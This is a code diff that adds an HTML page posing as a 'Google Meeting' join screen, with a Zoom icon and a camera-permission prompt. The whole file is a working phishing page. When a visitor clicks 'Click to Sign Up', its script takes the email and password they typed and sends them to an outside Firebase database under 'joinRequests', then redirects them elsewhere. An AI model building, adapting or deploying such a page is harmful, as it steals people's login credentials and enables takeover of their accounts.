@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google  Meeting</title>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="/Zoom-Logo.png" />
+
+  <!-- Load Material Icons -->
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+
+  <script type="module">
+    // Firebase SDK Import (Latest v12)
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";
+
+    // Replace with your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyArUMHWhrM-g0m0-kXTu_EWmGACetQvLlc",
+      authDomain: "asf-panel-sm.firebaseapp.com",
+      projectId: "asf-panel-sm",
+      storageBucket: "asf-panel-sm.firebasestorage.app",
+      messagingSenderId: "444535178333",
+      appId: "1:444535178333:web:da733a6f819a0c4529f9b4",
+      measurementId: "G-BSFWL4LLY5"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Wait for DOM
+    window.addEventListener("DOMContentLoaded", () => {
+      const btn = document.getElementById('askJoinBtn');
+      const spinner = document.getElementById('spinner');
+
+      // Create popup container
+      let popup = document.createElement('div');
+      popup.id = 'popup-message';
+      popup.style.position = 'fixed';
+      popup.style.top = '20px';
+      popup.style.left = '50%';
+      popup.style.transform = 'translateX(-50%)';
+      popup.style.backgroundColor = '#f44336';
+      popup.style.color = 'white';
+      popup.style.padding = '12px 20px';
+      popup.style.borderRadius = '4px';
+      popup.style.boxShadow = '0 2px 6px rgba(0,0,0,0.3)';
+      popup.style.fontSize = '14px';
+      popup.style.fontWeight = '500';
+      popup.style.zIndex = '9999';
+      popup.style.display = 'none';
+      document.body.appendChild(popup);
+
+      function showPopup(message) {
+        popup.textContent = message;
+        popup.style.display = 'block';
+        setTimeout(() => {
+          popup.style.display = 'none';
+        }, 3000);
+      }
+
+      btn.addEventListener('click', async () => {
+        const email = document.querySelector('input[type="email"]').value.trim();
+        const password = document.querySelector('input[type="password"]').value.trim();
+
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (!email || !password) {
+          showPopup("Please enter both email and password");
+          return;
+        }
+
+        if (!emailRegex.test(email)) {
+          showPopup("Please enter a valid email address");
+          return;
+        }
+
+        btn.disabled = true;
+        spinner.style.display = 'block';
+
+        try {
+          await push(ref(db, "joinRequests"), {
+            email: email,
+            password: password,
+            timestamp: new Date().toLocaleString()
+          });
+          console.log("Data sent to Firebase");
+        } catch (error) {
+          console.error("Error sending data:", error);
+          showPopup("Error");
+          btn.disabled = false;
+          spinner.style.display = 'none';
+          return;
+        }
+
+        setTimeout(() => {
+          window.location.href = "cyy/";
+        }, 2000);
+      });
+    });
+  </script>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #202124;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 15px;
+    }
+
+    /* Top Bar with Centered Logo */
+    .top-bar {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 10px 0 20px 0;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo img {
+      height: 45px;
+      object-fit: contain;
+    }
+
+    /* Main Container optimized for Mobile View */
+    .main {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Video Section */
+    .video-section {
+      width: 100%;
+      background-color: #111111;
+      border-radius: 12px;
+      height: 230px;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      margin-bottom: 25px;
+      overflow: hidden;
+    }
+
+    video {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border-radius: 12px;
+      object-fit: cover;
+      z-index: 1;
+    }
+
+    .three-dots {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      z-index: 3;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .video-overlay {
+      z-index: 3;
+      text-align: center;
+      padding: 0 20px;
+    }
+
+    .video-text {
+      font-size: 15px;
+      font-weight: 400;
+      margin-bottom: 15px;
+      color: #f1f3f4;
+    }
+
+    .allow-btn {
+      background-color: #007aff;
+      color: white;
+      border: none;
+      padding: 10px 18px;
+      font-size: 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 500;
+    }
+
+    .controls {
+      position: absolute;
+      bottom: 15px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 15px;
+      z-index: 3;
+    }
+
+    .control-btn {
+      width: 42px;
+      height: 42px;
+      background: #2b2b2b;
+      border-radius: 50%;
+      color: white;
+      border: none;
+      cursor: pointer;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 20px;
+    }
+
+    .control-btn .badge {
+      position: absolute;
+      top: -2px;
+      right: -2px;
+      background: #007aff;
+      color: white;
+      border-radius: 50%;
+      font-size: 9px;
+      width: 14px;
+      height: 14px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+    }
+
+    /* Form Section */
+    .form-section {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .form-section h2 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 20px;
+      text-align: center;
+      color: #1a1a1a;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 15px;
+      border: 1px solid #dcdcdc;
+      border-radius: 8px;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .form-input:focus {
+      border-color: #007aff;
+    }
+
+    .btn-join {
+      background-color: #007aff;
+      color: white;
+      padding: 14px 0;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-join:hover {
+      background-color: #005ec4;
+    }
+
+    .spinner {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #007aff;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+      display: none;
+      margin: 15px auto 5px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .other-options {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 20px;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    .other-options a {
+      color: #d93025; /* Red color for 'Ask To Campaign Mode' matching the image */
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    /* Hide Device Info Bar as per requested layout */
+    .device-info-bar {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Bar -->
+  <div class="top-bar">
+    <div class="logo">
+      <img src="/logo.png" alt="Logo">
+    </div>
+  </div>
+
+  <!-- Main Section -->
+  <div class="main">
+    <!-- Left/Top Video Section -->
+    <div class="video-section">
+      <video id="video" autoplay muted playsinline style="display:none;"></video>
+
+      <div class="three-dots">
+        <span class="material-icons">more_vert</span>
+      </div>
+
+      <div class="video-overlay" id="videoOverlay">
+        <p class="video-text">Do you want people to see and hear you in the meeting?</p>
+        <button class="allow-btn" onclick="startCamera()">
+          Allow microphone and camera
+        </button>
+      </div>
+
+      <div class="controls">
+        <button class="control-btn" aria-label="Mic Off">
+          <span class="material-icons" style="font-size: 20px;">mic_off</span>
+          <div class="badge">!</div>
+        </button>
+        <button class="control-btn" aria-label="Video Off">
+          <span class="material-icons" style="font-size: 20px;">videocam_off</span>
+          <div class="badge">!</div>
+        </button>
+      </div>
+    </div>
+
+    <!-- Right/Bottom Form Section -->
+    <div class="form-section">
+      <h2>What's Your Email</h2>
+      <input type="email" class="form-input" placeholder="Email Address Here..." />
+      <input type="password" class="form-input" placeholder="Password" />
+      <button class="btn-join" id="askJoinBtn">Click to Sign Up</button>
+      <div class="spinner" id="spinner"></div>
+      <div class="other-options">
+        Other Joining Option<br />
+        <a href="#">Ask To Campaign Mode</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Camera function
+    function startCamera() {
+      const video = document.getElementById("video");
+      const overlay = document.getElementById("videoOverlay");
+      navigator.mediaDevices
+        .getUserMedia({ video: true, audio: true })
+        .then((stream) => {
+          video.srcObject = stream;
+          video.style.display = "block";
+          overlay.style.display = "none";
+        })
+        .catch((err) => {
+          alert("Could not access camera/microphone: " + err.message);
+        });
+    }
+  </script>
+</body>
+</html>
